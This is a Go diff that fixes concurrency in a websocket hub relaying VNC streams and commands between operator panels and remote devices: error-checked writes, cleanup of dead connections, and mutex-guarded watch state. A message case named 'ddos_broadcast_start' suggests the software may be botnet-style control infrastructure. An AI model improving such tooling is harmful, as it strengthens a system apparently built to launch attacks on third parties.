@@ -146,15 +146,15 @@ func (h *Hub) RemovePanel(id string) {
 const wsWriteTimeout = 5 * time.Second
 
 // panelWrite writes to a panel with a deadline. Must be called with p.mu held.
-func panelWrite(p *PanelConn, mt int, data []byte) {
+func panelWrite(p *PanelConn, mt int, data []byte) error {
 	p.Conn.SetWriteDeadline(time.Now().Add(wsWriteTimeout))
-	p.Conn.WriteMessage(mt, data)
+	err := p.Conn.WriteMessage(mt, data)
 	p.Conn.SetWriteDeadline(time.Time{})
+	return err
 }
 
 func (h *Hub) NotifyPanels(teamID string, msg map[string]any) {
 	data, _ := json.Marshal(msg)
-	// Snapshot under RLock, write outside to avoid holding lock during I/O
 	h.mu.RLock()
 	targets := make([]*PanelConn, 0)
 	for _, p := range h.panels {
@@ -164,10 +164,18 @@ func (h *Hub) NotifyPanels(teamID string, msg map[string]any) {
 	}
 	h.mu.RUnlock()
 
+	var dead []*PanelConn
 	for _, p := range targets {
 		p.mu.Lock()
-		panelWrite(p, websocket.TextMessage, data)
+		err := panelWrite(p, websocket.TextMessage, data)
 		p.mu.Unlock()
+		if err != nil {
+			dead = append(dead, p)
+		}
+	}
+	for _, p := range dead {
+		p.Conn.Close()
+		h.RemovePanel(p.ID)
 	}
 }
 
@@ -175,16 +183,27 @@ func (h *Hub) RelayBinaryToWatchers(deviceID, deviceTeamID string, data []byte) 
 	h.mu.RLock()
 	targets := make([]*PanelConn, 0)
 	for _, p := range h.panels {
-		if p.Watching == deviceID && p.TeamID == deviceTeamID {
+		p.mu.Lock()
+		watching := p.Watching
+		p.mu.Unlock()
+		if watching == deviceID && p.TeamID == deviceTeamID {
 			targets = append(targets, p)
 		}
 	}
 	h.mu.RUnlock()
 
+	var dead []*PanelConn
 	for _, p := range targets {
 		p.mu.Lock()
-		panelWrite(p, websocket.BinaryMessage, data)
+		err := panelWrite(p, websocket.BinaryMessage, data)
 		p.mu.Unlock()
+		if err != nil {
+			dead = append(dead, p)
+		}
+	}
+	for _, p := range dead {
+		p.Conn.Close()
+		h.RemovePanel(p.ID)
 	}
 }
 
@@ -639,24 +658,39 @@ func handlePanelMessage(pc *PanelConn, msg map[string]any) {
 		}
 
 	case "start_watching":
+		pc.mu.Lock()
 		pc.Watching = deviceID
+		pc.mu.Unlock()
 		send(deviceID, msg)
 		H.logPanelAction(pc, "vnc_start", deviceID, "")
 
 	case "stop_watching":
-		H.logPanelAction(pc, "vnc_stop", pc.Watching, "")
-		send(deviceID, msg)
+		pc.mu.Lock()
+		prev := pc.Watching
 		pc.Watching = ""
+		pc.mu.Unlock()
+		H.logPanelAction(pc, "vnc_stop", prev, "")
+		send(deviceID, msg)
 
 	case "start_stream":
+		pc.mu.Lock()
+		pc.Watching = deviceID
+		pc.mu.Unlock()
 		send(deviceID, msg)
 		H.logPanelAction(pc, "vnc_start", deviceID, "start_stream")
 
 	case "stop_stream":
+		pc.mu.Lock()
+		pc.Watching = ""
+		pc.mu.Unlock()
 		send(deviceID, msg)
 		H.logPanelAction(pc, "vnc_stop", deviceID, "stop_stream")
 
 	case "start_device_metrics", "start_skeleton", "request_keyframe":
+		// Register this panel as watcher so binary frames from device are relayed back.
+		pc.mu.Lock()
+		pc.Watching = deviceID
+		pc.mu.Unlock()
 		send(deviceID, msg)
 
 	case "ddos_broadcast_start", "ddos_broadcast_stop":
